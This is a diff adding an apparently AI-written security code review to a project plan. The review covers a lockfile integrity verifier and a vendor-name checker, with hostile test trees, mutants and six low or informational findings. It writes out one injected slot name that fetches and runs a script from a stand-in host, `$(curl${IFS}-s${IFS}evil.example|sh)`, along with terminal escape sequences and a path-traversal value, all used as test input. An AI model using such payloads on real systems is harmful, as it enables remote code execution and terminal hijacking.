@@ -1,7 +1,7 @@
 # Plan: neutrality and upgrade slots -- a vendor-name check that reads zero, and a note for slots an upgrade adds
 
 **Source proposal**: `dev/proposals/archive/2026-10-17-claude-neutrality-and-upgrade-slots.md`
-**Status**: awaiting-code-review
+**Status**: revising-code
 **Plan review**: required(Internal + Internal Security Review)
 **Assurance path**: high-assurance -- inherited from the proposal: the work widens the neutrality checker, adds code to the lockfile reader adopters run before they trust their scripts (`bootstrap/verify_integrity.py`), and edits comments in two security-relevant scripts (the interpreter binding and the content scanner)
 **Opened**: 2026-10-18
@@ -1327,3 +1327,228 @@ bootstrap/tests/test_verify_integrity.py::test_a_placeholder_reworded_by_an_upgr
 * Three more future-tense "Goal 1" lines remain in `docs/DOCUMENTATION_PLAN.md` (`:178`, `:207`, `:365`); the plan named six lines and C6 corrected those six.
 * The note has no cap on the number of lines it prints; a base copy with thousands of unfilled slots prints thousands of lines. A changed lockfile and base copy can already steer the note (S5), and the output grants nothing.
 * The suite was run once, at one shuffle seed (`--quality-gate-shuffle-seed=0`), as the plan specifies.
+
+## Code review -- Claude Opus 5.5 (Security Review) -- 2026-10-18
+
+```
+Reviewed commit: afbb1f232bc2e7fa8a639590632aba15ce58ce89
+Target: the security-relevant chunks at that commit, read against the plan's parent bb4f710a: C8 and C9 (ca7179a6, 63336156, 7d528f4d; bootstrap/verify_integrity.py and bootstrap/tests/test_verify_integrity.py), C2's rewording of tools/session.py and templates/skills/_lib/session.py (in 01d21423), and C1's checker (1fb06ea6)
+Prior findings: NU-SR1 to NU-SR6 (e4eafbc8) and the Response that folded them; the proposal's SR2-SR5, SR9, SR12, SR15 and SR16 where they touch C8-C9
+Assurance path: high-assurance
+```
+
+**Obligation**: Internal Security Review
+**Tier**: Internal Security Review
+**Findings**: raised (6; none blocking)
+
+**Model**: claude-opus-5-5
+
+Distance: a fresh session. I wrote none of the code, the plan, the proposal or any of their reviews, and I am not the implementer (the record above is signed Claude Sonnet 5.5). This pass is the Security Review of the code only; the ordinary code review is a separate session's.
+
+### In plain terms
+
+**The security obligation clears.** I tried to make the new slot note change the check's pass-or-fail result, hang, print a raw control character or print a command of its own, and I tried to slip a vendor name past the stricter checker. None of it worked.
+
+* On 24 hostile trees and a real install (passing and broken), the old check (`bb4f710a`) and the new one give the same exit code and the same report, apart from the note's own lines. Every note line is plain printable text; escape characters show as `\x1b` and the like.
+* Special files and swaps are refused, and nothing hangs: a pipe (FIFO), a socket, a folder, a symlink, or a file swapped for a symlink or a FIFO after the path check.
+* The comment edits to the interpreter-binding script change no code. All 54 of its functions are identical apart from two docstring lines, and the two copies are byte-identical.
+* No marker inside `templates/` can hide a name: all 19 marker and file-type plants were caught.
+
+**Three small fixes are worth making. None blocks.**
+
+1. **NU-CSR1.** The new size limit on token substitution applies to each slot, not each file. A crafted lockfile and 750 KB of files made the check take 8.4 seconds instead of 0.07, and the time grows with the number of lockfile entries.
+2. **NU-CSR2.** The check now holds every accepted file in memory until the note runs. Twelve 40 MB files took 536 MB instead of 112 MB.
+3. **NU-CSR3.** One of the reader's guards (it refuses `..` in a base-copy path) has no test. Removing it breaks no test, and then the note reads a file outside the project.
+
+There are also three wording points (NU-CSR4 to NU-CSR6). Both resource findings need someone to change the lockfile, which review sees. Both fail toward a slow or failed run, never a false pass.
+
+Status moves to `revising-code`, because NU-CSR1 to NU-CSR3 change code or tests. If the revision touches only the lines those findings name, no second Security Review is owed for them. A changed implementation byte still voids the Boundary B record, so a fresh run is owed (`AGENTS.md`, Boundary C).
+
+### What I ran
+
+Every run used `/Users/kendal30/conda_envs/lhm/bin/python3.13` (Python 3.13.13) on macOS. The trees were detached `git worktree`s of `afbb1f23` and `bb4f710a` in a fresh, empty scratch folder of my own, plus `git archive` extractions for the mutants and the gate plants; the shared tree was never touched. In my scratch worktree I placed the parent's verifier beside the new one, under the name `verify_integrity_parent.py`, so both run on the same engine. The two blobs I read are the ones the implementation record tested: `verify_integrity.py` `4376f4bd`, the test file `607ab83c`.
+
+**1. Hostile trees, old against new.** Each tree was built with the suite's record shape. Both verifiers ran as `python <file> --target <tree>`, and I compared exit code, stdout, and stderr with the `slot note:` lines removed.
+
+| Tree | Old exit | New exit | Same report | What the note did |
+|---|---|---|---|---|
+| escape bytes (ESC, BEL, newline, right-to-left mark) in a path and a slot name | 0 | 0 | yes | listed it as `'evil\x1b[31mRED...\n...‮RTL.md' slot '\x1b]0;pwned\x07\x1b[2J'`; 0 non-printable note lines |
+| escape bytes and `$(...)` in a token value | 0 | 0 | yes | values are never printed |
+| NUL bytes in slot bodies | 0 | 0 | yes | parsed as text |
+| 6,000 nested openers then 6,000 closers, cap-sized | 0 | 0 | yes | 0.09 s |
+| `<!--` followed by a cap of whitespace | 0 | 0 | yes | 0.09 s |
+| a cap of unclosed 200-character slot names | 0 | 0 | yes | 0.10 s |
+| one slot, one token value just under the cap | 0 | 0 | yes | built, compared |
+| 4,000 slots in one file, each body one near-cap token | 0 | 0 | yes | 0.48 s (NU-CSR1) |
+| 3,000 records | 0 | 0 | yes | 0.51 s against 0.35 s; 3,003 note lines (the recorded "no line cap" omission) |
+| a record that is a string; `files` that is a mapping | 1 | 1 | same crash | `AttributeError` at the same loop line in both, before any verdict |
+| 200,000 tokens | 0 | 0 | yes | 0.18 s |
+| `verbatim: "false"` (a non-empty string, so true) | 0 | 0 | yes | not read |
+| `living_state: "no"` on a living-state path | 0 | 0 | yes | read as living state, as the loop treats it |
+| the same record twice | 0 | 0 | yes | counted twice |
+| eleven `base_cache` shapes | 0 | 0 | yes | the `./` and `//` forms normalize into `dev/.cairn/base/` and are read; absolute, `..`, the folder itself, the lockfile, empty, an upper-case prefix, a list, a mapping and `true` are "unreadable" |
+| a living-state file hard-linked to a file outside the project | 0 | 0 | yes | read and listed (see the swaps below) |
+| a FIFO at an accepted path | 1 | 1 | yes | the integrity pass reports `missing`, as before |
+| a FIFO, a socket, or a no-permission file at a living-state path | 0 | 0 | yes | "unreadable", 0.10 s |
+| a modified file with a customized slot and a planted line | 1 | 1 | yes | counted "failed the integrity check"; no command on a note line |
+| twelve 40 MB hash-matching files | 0 | 0 | yes | peak memory 112 MB to 536 MB (NU-CSR2) |
+| a fresh `solo-greenfield` install; the same with a planted line in `AGENTS.md` | 0; 1 | 0; 1 | yes | 20 placeholders listed, and 16 once `AGENTS.md` fails; report first in a merged stream |
+
+**2. Swaps between the path check and the open.** I wrapped `os.open` so it swaps the path just before the real call.
+
+* A living-state file swapped for a symlink is refused (`O_NOFOLLOW`). Swapped for a FIFO, it is refused (not a regular file) and does not hang. The same two swaps on a base copy are refused too; my first harness hit those by accident.
+* A base copy's parent folder swapped for a link to an outside folder: the outside file is read, then rejected by `base_hash`.
+* A living-state file's parent folder swapped for a link to an outside folder: the outside file is read and its content decides one listing, but the name printed comes from the hash-checked base copy. A hard link reaches outside the same way, with no race, because the walk checks for symlinks, not hard links. Both are the residual S5 names, and harmless for the reason S5 gives. Walking by directory descriptors (`os.open(..., dir_fd=...)`) would close both, but it needs a platform branch in a trust anchor. I do not recommend it.
+
+**3. Streams.**
+
+* Merged stdout and stderr: on both real trees the report comes before the first `slot note:` line.
+* Stderr to a closed pipe: a passing run exits 0 before and 120 now, as C10 documents; a failing run exits 120 in both. Stdout to a closed pipe: 120 in both.
+* With file descriptor 2 closed (`2>&-`), the note's lines land on stdout, as the old report's lines already do, because Python prints to stdout when `sys.stderr` is `None`. The exit code is unchanged.
+* With file descriptor 1 closed, the note prints `slot note: not run (AttributeError)`: the flush meets a `None` stdout and the fence catches it. Harmless.
+* No shipped program parses this check's output (`git grep`: only tests call `verify()`), so the new stderr text cannot change another tool's decision.
+
+**4. "Prints no commands."** I listed the print sites from the tree (`bootstrap/verify_integrity.py:315`, `:317`, `:324`, `:327`, `:345`). Each prints fixed text, a count, a value passed through `ascii()`, or an exception type name reduced to `[A-Za-z0-9_?]`. The note's own words name no command. Tree text can still spell one inside quotes; NU-CSR5.
+
+**5. C2, the interpreter binding.**
+
+* The plan's ten-function script reads **SAME** for both copies, against `b13ad7b7` and against `01d21423`'s parent `ef08e2a4`. K2's whole-module script also reads SAME.
+* My own comparison covers all 54 functions. The full dump differs only for `cmd_session_start` and `cmd_session_end`, and the docstring-stripped dump differs for none. Controls: one added statement in `_resolve_interpreter` is flagged, and one in `cmd_session_start` is flagged.
+* The diff is three hunks: a `#:` comment at `:215-217`, and one docstring line each at `:905` and `:1338`. Nothing in the file reads `__doc__` or `getdoc`. No `nosec`, `noqa`, `pragma`, `type:` or encoding line is added or removed in any `.py` file of `01d21423`, and no file mode changes. All 20 `.py` files in that commit read SAME.
+* `cmp` exits 0 for the `session.py` pair, and also for `content_scan.py`, `intent.py`, `onboarding_activate.py`, the six `_onboarding` modules and `vendor_targets.yml`. The control pair differs.
+* `01d21423` is the only commit in `bb4f710a..afbb1f23` that touches either copy. The shared working tree holds another session's uncommitted edits to both; I read committed bytes only.
+
+**6. C1, the gate.** Each plant was added alone to a clean extraction of `afbb1f23`; the control reads `fail=0 info=56`.
+
+| Plant in `templates/core/` | `fail=` |
+|---|---|
+| same-line `vendor-ok` on a name; upper-case `VENDOR-OK`; a name in a whole-line HTML comment, a code fence, a `.py` comment, a `.py` docstring, a `.json` key, a `.yml` comment, a `.txt`; `Claude's`; CRLF lines; invalid UTF-8 beside a name | 1 each |
+| own-line `vendor-ok` above a name; `vendor-ok :` with a space; an unclosed block marker; a `case-study` marker; a name inside a marker reason | 2 each |
+| block markers around a name | 3 |
+| the plan's named limits: plural `GPTs`; a `.sh` file; an upper-case `.MD`; an extensionless file; UTF-16; a zero-width joiner inside the name | 0 each |
+| a listed name in a file **name** only (`Claude-notes.md`, neutral text) | 0 (NU-CSR6) |
+
+All 97 rows of `scaffold.py --manifest` take their source from under `templates/`. The control, a made-up path, is reported missing. The shipped source types are `.md` 44, `.py` 44, `.json` 3, `.txt` 3, `.yml` 2 and one `.gitkeep`, all read by the gate. No shipped source or destination path contains a listed word, case-insensitive.
+
+**7. My own mutants.** I made 14, each in a fresh extraction, and ran `bootstrap/tests/test_verify_integrity.py` against each. The unmutated control: 122 passed in 4.1 s, and all 19 node IDs collected at `bb4f710a` are still collected.
+
+| Mutant | Result | Killed by |
+|---|---|---|
+| drop `O_NONBLOCK` | killed | `base_cache-a-fifo` (20 s timeout) |
+| drop the per-component symlink walk | killed | `base_cache-symlinked-parent` |
+| drop the `dev/.cairn/base/` prefix check | killed | `base_cache-outside-base-dir` |
+| drop the `..` check | **survived** | none; not equivalent (NU-CSR3) |
+| read the cap instead of cap + 1 | killed | `base-copy-over-the-cap` |
+| skip the `base_hash` check | killed | `base_hash-does-not-match` |
+| read a living-state file with `Path.read_bytes()` | killed | `living-a-fifo` (timeout) |
+| the fence catches `Exception` only | killed | the `SystemExit` test |
+| the fence prints the exception's message | killed | `test_an_exception_in_the_note_becomes_one_line_naming_only_its_type` |
+| drop the flush | killed | `test_the_report_comes_before_the_note_in_a_merged_stream` |
+| failed count off by one | killed | `base_cache-not-a-string` (coverage figures) |
+| `str()` instead of `ascii()` for the slot name; for the path | killed, killed | `test_an_unfilled_slot_is_listed` |
+| drop the substitution-length bound | killed | `token-value-times-twenty-over-the-cap` |
+
+Also run: `test_security_lint.py` and `test_scaffold_substrate.py`, 29 passed. The reader's one `os.open` and the loop's existing `read_bytes` are the only reads in the file, and no module-level statement names an `os.O_*` flag.
+
+### The baseline: NU-SR1 to NU-SR6 as built
+
+| Finding | Asked for | Built as specified? | Evidence |
+|---|---|---|---|
+| NU-SR1 | living-state files fed hostile input; one reader; the `read_bytes` mutant; containment named; the race line in S5 | yes | six `living-*` cases in the verdict test, each asserting its coverage; the grep above; my `read_bytes` mutant killed by the FIFO case; D7 and S5 |
+| NU-SR2 | substitution bounded; pairing by one pass; a closed-slot linear test with an absolute bound, best of three | partly | `_slots` is one pass plus a name map; `test_closed_slots_on_both_sides_cost_linear_time` asserts `_best_of_three(...) < 0.25`; the bound is per slot, not per file (NU-CSR1) |
+| NU-SR3 | the ten functions by name, docstring-stripped for two | yes | re-run above, controls fire |
+| NU-SR4 | the loop adds lines only; the failed count after the loop; old against new; the flush; a merged-stream subprocess test; exit 120 named | yes | `git diff -U0 bb4f710a afbb1f23 -- bootstrap/verify_integrity.py` removes no line; the count is taken in `_run_slot_note` (`:338-340`); my 24 trees; flush at `:337`; exit 120 confirmed and documented (wording: NU-CSR4) |
+| NU-SR5 | the frozen test adds lines only, with all 19 base nodes collected; phase-mutable files and the oracle's evidence named | yes | 0 removed lines; 19 of 19 collected among 122; `dev/PLANNING.md:252` and *Scope* |
+| NU-SR6 | marked lines outside `templates/` named among zero's limits | yes | `doctrine/consolidation-review.md:90`, *In brief* |
+
+**The proposal's SR items, where they touch C8 and C9.**
+
+| Item | Built? |
+|---|---|
+| SR2 (the base copy is hashed first) | yes: the hash at `:242-245` comes before any decode or parse; the skip-the-hash mutant is killed |
+| SR3 (a separate pass after the verdict that never sees the violations, the skipped count or the exit code; regular files only; errors become counts; an unsafe `base_cache` still fails on its own) | yes: the call is the last thing before each `return`; the signature test; `fstat`; the per-record `except`; `test_a_record_with_an_unsafe_base_copy_still_fails_on_its_own` |
+| SR4 (`base_hash`, the base-folder containment, the cap, `ascii()`) | yes, with NU-CSR3's missing test |
+| SR5 (the marker only to keep Cairn's text; empty slots counted) | yes: the advice at `:312-314`; `base_body.strip()` at `:267` |
+| SR9 (living-state files read and counted) | yes |
+| SR12 (the seven build details) | yes, apart from the per-file bound (NU-CSR1) |
+| SR15 (no printed command) | yes for the note's own words (NU-CSR5) |
+| SR16 (the planted-line test reads only the note's lines) | yes: `test_a_first_install_with_a_planted_line_gets_no_command_from_the_note`, and reproduced by my planted-line tree |
+
+### Findings
+
+**[NU-CSR1] (Low, non-blocking) The substitution bound limits each slot, not each file, so a crafted lockfile can make the check slow.**
+
+* **Evidence.**
+  * `_substituted` (`bootstrap/verify_integrity.py:207-222`) refuses a body whose substituted length would pass the 256 KiB cap. `_note_file` calls it once per slot (`:262`).
+  * A base copy under the cap holds about 4,800 slots, each body one `{{v}}`, and the lockfile's token value can sit just under the cap. Every body then passes, and the note builds about 4,800 x 256 KiB, roughly 1.2 GB of text, for one file.
+  * Measured: 50 such files (12 MB on disk) took 21.2 s, against 0.07 s for the parent. Duplicate records are accepted, so one file pair (750 KB) listed 20 times in the lockfile took 8.4 s against 0.07 s, and the time grows with the record count.
+  * Memory stays flat, because each string is dropped. The exit code is fixed before the note runs, so this delays the result and never changes it.
+  * It needs a lockfile change (tokens, records and `base_hash`), which S5 concedes can already steer the note and which review sees.
+  * C9's criterion "Substitution is bounded" is green as written, since its 24th case is one body over the cap. The property NU-SR2 asked for, linear end to end, is not met.
+* **Recommended fix.**
+  * Give each file one budget: keep a running total of substituted length across the file's slots, pass the remainder into `_substituted`, and count the file "unreadable" once it would pass the cap.
+  * Add a hostile case with many near-cap bodies in one file. It must come back "unreadable", fast.
+  * Add the mutant "per-slot bound only".
+
+**[NU-CSR2] (Low, non-blocking) The record loop now keeps every accepted file whole until the note runs.**
+
+* **Evidence.**
+  * `accepted.append((rec, on_disk))` (`:423`) holds the full bytes of each accepted non-verbatim file for the rest of the loop; the parent dropped them file by file.
+  * The note uses the bytes only when the record has a base copy and the file is under the cap (`:248-251`). For everything else they are held for nothing.
+  * Measured on twelve 40 MB hash-matching files with no base copy: peak memory 112 MB for the parent, 536 MB for the new check.
+  * This is the one place the change adds cost inside the loop that decides the verdict. On a host short of memory, a tree that passed before could now crash, which fails closed. Real non-verbatim records are small Markdown files, so the risk is low. But the plan's promise is that the note cannot change the result, and this is the one route by which it can.
+* **Recommended fix.** Keep only what the note can use: `accepted.append((rec, on_disk[:_NOTE_CAP + 1]))`. A file over the cap still reads "unreadable", a file under it is the whole hashed bytes, and the loop stays add-only.
+
+**[NU-CSR3] (Low, non-blocking) The `..` guard in the shared reader has no test.**
+
+* **Evidence.**
+  * Removing `".." in path.parts` from `_read_bounded` (`:130`) leaves all 122 tests green.
+  * The mutant is not equivalent. Without the guard, a `base_cache` of `dev/.cairn/base/../../../../dotdot-outside.md` passes the prefix check, passes the component walk (a `..` part is a folder, not a link) and opens. The note then reads and uses a file outside the project: the built check reports `unreadable 1`, the mutant `checked 1, listed 1`.
+  * The suite's "outside the target" case uses `../outside.md`, which the prefix check refuses first, so it never reaches this guard.
+  * The code is right today. A later refactor that drops the guard, believing the prefix check covers it, would go unnoticed. The read is still bound by `base_hash`, so what is lost is containment (SR4), not what is printed.
+* **Recommended fix.** Add a hostile case `base_cache-dotdot-after-the-base-prefix` (expect "unreadable"), and add "drop the `..` check" to the mutation ledger.
+
+**[NU-CSR4] (Info) "One edge no code can close" is not accurate.**
+
+* **Evidence.**
+  * `bootstrap/UPGRADE.md:108`, with the plan's C10 and S4, says no code can stop a closed stderr pipe from turning a passing run's 0 into 120. The edge itself is confirmed: 0 before, 120 now.
+  * On a stand-in with the note's shape, pointing file descriptor 2 at `/dev/null` after the failed write (`os.dup2(os.open(os.devnull, os.O_WRONLY), 2)`) gives exit 0. So code can close it.
+  * Keeping the edge is fine: it only turns a pass into a failure.
+* **Recommended fix.** Reword to "one edge this check leaves open". I do not recommend the guard: it adds descriptor handling to a trust anchor for a case that already fails safe.
+
+**[NU-CSR5] (Info) "Prints no command" holds for the note's own words, not for tree text it repeats.**
+
+* **Evidence.**
+  * The docstring says the note "prints no command" (`:292`), and every print site is fixed text, a count, or a value passed through `ascii()`.
+  * But `ascii()` leaves printable text alone, and a project path may contain spaces. One tree's lockfile recorded the path `python bootstrap/scaffold.py upgrade --target . --finalize AGENTS.md` (a folder and a file of those names) and a slot named `$(curl${IFS}-s${IFS}evil.example|sh)`. The note printed: `slot note: 'python bootstrap/scaffold.py upgrade --target . --finalize AGENTS.md' slot '$(curl${IFS}-s${IFS}evil.example|sh)' still holds the text Cairn shipped. ...`
+  * Both values sit inside quotes. Getting there takes a lockfile change, and anyone who can change the lockfile can already record a tampered file's hash directly. So this gives an attacker nothing new; the plan's Security Review named it as S5's "changed lockfile" residual.
+  * `test_no_line_of_the_note_prints_a_command` pins the note's wording on ordinary names, which is the right scope. The adopter guide makes no "never prints a command" promise.
+* **Recommended fix (optional).** Scope the docstring sentence: "It prints no command of its own; a path or slot name from the tree is shown quoted and escaped, and can spell any printable text." No code change.
+
+**[NU-CSR6] (Info) Two limits of "zero" could be stated, or made mechanical, cheaply.**
+
+* **Evidence.**
+  * (a) The gate reads file contents, not file or folder names: `templates/core/Claude-notes.md` with neutral text reads `fail=0`. No shipped path contains a listed word today (all 97 manifest rows checked). The stated limits (*In brief*, `doctrine/consolidation-review.md:90`) do not mention names.
+  * (b) The gate's `templates` suffix list is a fixed tuple (`scripts/quality_gate.py:456`). A template with another suffix (`.sh`, `.MD`, or none) reads `fail=0`. Every shipped type is on the list today, so nothing is missed now. The gap opens silently the day a new type ships, such as a shell-script hook.
+* **Recommended fix.**
+  * In the archive's `CHANGELOG.md` entry, which is not yet written, add file and folder names to what zero does not cover.
+  * Optionally, add one test that every `scaffold.py --manifest` source suffix is one the gate reads under `templates/`, so a new shipped type fails a test instead of passing unseen.
+
+### Observed outside this change
+
+**The integrity report prints lockfile paths unescaped.** This predates the plan, and the plan's own note does not do it.
+
+* The report's lines at `bootstrap/verify_integrity.py:382-419` (`unsafe dst`, `malformed hash`, `dst escapes`, `illegal living_state`, `missing`, `modified`) and the hint's `--finalize` list (`:462`) put `dst_rel` into the output raw.
+* A lockfile path holding `ESC ] 0 ; ... BEL ESC [ 2 J` reached the terminal raw through the `missing:` line, in the parent and in the new check alike. The note itself prints through `ascii()`.
+* This is shipped behaviour from before the plan, and it touches the hint, which the plan deliberately leaves alone. It wants its own record (a board row, or a small change with a Security Review), not a widening of this plan. No NU-CSR number, because it is not this change's.
+
+### What I did not cover
+
+* **Linux and Windows.** I ran on macOS only, so `O_NONBLOCK` on a FIFO and `O_NOFOLLOW` on a symlinked leaf were exercised on one platform.
+* **The full suite.** Boundary B is the implementer's. I ran `test_verify_integrity.py` (122), `test_security_lint.py` and `test_scaffold_substrate.py` (29).
+* **The implementer's 36-mutant ledger.** I did not repeat it; I ran 14 of my own, aimed at the reader, the fence, the order and the printing.
+* **Real races.** I forced every swap by wrapping `os.open`; I did not try to win a race against an unmodified process.
+* **Rewordings that lost an explanation** (K5) in C3-C5, the one-time name search, the 16-pair twin listing, and the markers' placement. Those are the ordinary code review's. I checked only that the code did not change, and `cmp` on 11 security-relevant pairs.
+* **The note's agreement with the engine's marker parsing**, beyond reading the tests that pin it.
+* **Unicode look-alikes in vendor names.** That is the plan's named "hiding a name on purpose" limit.
+* **Other sessions' uncommitted edits** in the shared tree (including `bootstrap/UPGRADE.md`, `tools/session.py` and `templates/skills/_lib/session.py`). I reviewed committed bytes only.
